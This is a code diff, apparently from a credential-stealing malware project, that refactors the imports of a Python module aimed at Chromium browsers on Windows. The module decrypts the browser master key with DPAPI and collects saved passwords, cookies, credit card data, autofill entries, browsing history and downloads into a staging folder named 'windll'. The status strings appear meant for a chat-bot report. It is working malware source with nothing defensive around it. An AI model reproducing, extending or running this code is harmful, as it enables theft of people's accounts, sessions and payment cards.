@@ -1,7 +1,8 @@
-import os
-import glob
-import base64
-import json
+from os import remove,environ, makedirs, getenv
+from os.path import join, exists, dirname
+from glob import glob
+from base64 import b64decode
+from json import loads
 from win32crypt import CryptUnprotectData
 from manager.logger import Log
 from shutil import copy2
@@ -18,17 +19,17 @@ autofills = ''''''
 msgInfo = ''''''
 
 def get_master_key(path: str):
-    if not os.path.exists(path):
+    if not exists(path):
         return None
-    local_state_path = os.path.join(path, "Local State")
-    if not os.path.exists(local_state_path):
+    local_state_path = join(path, "Local State")
+    if not exists(local_state_path):
         return None
     with open(local_state_path, "r", encoding="utf-8") as f:
         c = f.read()
     if 'os_crypt' not in c:
         return None
-    local_state = json.loads(c)
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    local_state = loads(c)
+    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
     
@@ -68,8 +69,8 @@ def get_login_data(path, master_key, blink = False):
                 profile = path[num+1:]
                 logins += f"===============================\n\n\n{profile}:\n\n"
             login_db = f'{path}\\Login Data'
-            copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
-            conn = connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
+            copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
+            conn = connect(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
             cursor = conn.cursor()
 
         
@@ -83,7 +84,7 @@ def get_login_data(path, master_key, blink = False):
                 alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
                 logins += alldatapass
             try:
-                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
+                remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
             except:
                 pass
         except Exception as e:
@@ -104,9 +105,9 @@ def get_web_history(path, blink = False):
             history += f"===============================\n\n\n{profile}:\n\n"
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
-        history_db = os.path.join(path, 'history')
-        copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
-        c = connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
+        history_db = join(path, 'history')
+        copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
+        c = connect(environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
         cursor = c.cursor()
         for result in cursor.execute(HistorySQL).fetchall():
             data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
@@ -115,7 +116,7 @@ def get_web_history(path, blink = False):
                 continue
             history += result
         try:
-            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
+            remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
         except:
             pass
     except Exception as e:
@@ -130,10 +131,10 @@ def get_downloads(path, blink = False):
             profile = path[num+1:]
             downhistory += f"===============================\n\n\n{profile}:\n\n"
         downloads_db = f'{path}\\History'
-        if not os.path.exists(downloads_db):
+        if not exists(downloads_db):
             return
-        copy2(downloads_db, os.path.dirname(path)+'\\downloads_db')
-        conn = connect(os.path.dirname(path)+'\\downloads_db')
+        copy2(downloads_db, dirname(path)+'\\downloads_db')
+        conn = connect(dirname(path)+'\\downloads_db')
         cursor = conn.cursor()
         cursor.execute('SELECT tab_url, target_path FROM downloads')
         for row in cursor.fetchall():
@@ -145,7 +146,7 @@ Local Path: {row[1]}
 """
         conn.close()
         try:
-            os.remove(os.path.dirname(path)+'\\downloads_db')
+            remove(dirname(path)+'\\downloads_db')
         except:
             pass
     except Exception as e:
@@ -159,10 +160,10 @@ def get_cookies(path, master_key, blink = False):
             profile = path[num+1:]
             cookies += f"===============================\n\n\n{profile}:\n\n"
         cookie_db = path + '\\Network\\Cookies'
-        if not os.path.exists(cookie_db):
+        if not exists(cookie_db):
             return None
-        copy2(cookie_db, os.path.dirname(path)+'\\cookie_db')
-        conn = connect(os.path.dirname(path)+'\\cookie_db')
+        copy2(cookie_db, dirname(path)+'\\cookie_db')
+        conn = connect(dirname(path)+'\\cookie_db')
         cursor = conn.cursor()
         cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
         for row in cursor.fetchall():
@@ -174,7 +175,7 @@ def get_cookies(path, master_key, blink = False):
             cookies += cookie_line + "\n\n"
         conn.close()
         try:
-            os.remove(os.path.dirname(path)+'\\cookie_db')
+            remove(dirname(path)+'\\cookie_db')
         except:
             pass
     except Exception as e:
@@ -188,10 +189,10 @@ def get_autofils(path, blink = False):
             profile = path[num+1:]
             autofills += f"===============================\n\n\n{profile}:\n\n"
         webdata = f'{path}\\Web Data'
-        if not os.path.exists(webdata):
+        if not exists(webdata):
             return
-        copy2(webdata, os.path.dirname(path)+'\\Web Data')
-        conn = connect(os.path.dirname(path)+'\\Web Data')
+        copy2(webdata, dirname(path)+'\\Web Data')
+        conn = connect(dirname(path)+'\\Web Data')
         cursor = conn.cursor()
         cursor.execute('SELECT name, value FROM autofill')
         for row in cursor.fetchall():
@@ -203,7 +204,7 @@ Value: {row[1]}
 """
         conn.close()
         try:
-            os.remove(os.path.dirname(path)+'\\Web Data')
+            remove(dirname(path)+'\\Web Data')
         except:
             pass
     except Exception as e:
@@ -218,10 +219,10 @@ def get_credit_cards(path, master_key, blink = False):
             profile = path[num+1:]
             cards += f"===============================\n\n\n{profile}:\n\n"
         cards_db = f'{path}\\Web Data'
-        if not os.path.exists(cards_db):
+        if not exists(cards_db):
             return
-        copy2(cards_db, os.path.dirname(path)+'\\cards_db')
-        conn = connect(os.path.dirname(path)+'\\cards_db')
+        copy2(cards_db, dirname(path)+'\\cards_db')
+        conn = connect(dirname(path)+'\\cards_db')
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
         for row in cursor.fetchall():
@@ -236,7 +237,7 @@ Added On: {datetime.fromtimestamp(row[4])}
 """
         conn.close()
         try:
-            os.remove(os.path.dirname(path)+'\\cards_db')
+            remove(dirname(path)+'\\cards_db')
         except:
             pass
     except Exception as e:
@@ -255,7 +256,7 @@ def Write(pathToLogs, browser):
     if logins or cookies or history or downhistory or cards or autofills:
         try:
             msgInfo+=f"\n🔍{browser}"
-            os.makedirs(f"{pathToLogs}\\{browser}")
+            makedirs(f"{pathToLogs}\\{browser}")
             colected = True
         except:
             pass
@@ -319,8 +320,8 @@ def Chromium():
     Log("===========Chromium===========")
     msgInfo+="\n<b>🌐Browsers🌐</b>"
 
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+    local = getenv('LOCALAPPDATA')
+    roaming = getenv('APPDATA')
     pathToLogs = f"{local}\\windll\\Browsers"
 
     browsers = {
@@ -350,8 +351,8 @@ def Chromium():
 
     for key, value in browsers.items():
         master_key = get_master_key(value)
-        matching_folders = glob.glob(os.path.join(value, "Default"))
-        buff = glob.glob(os.path.join(value, "Profile*"))
+        matching_folders = glob(join(value, "Default"))
+        buff = glob(join(value, "Profile*"))
         for profile in buff:
             matching_folders.append(profile)
 
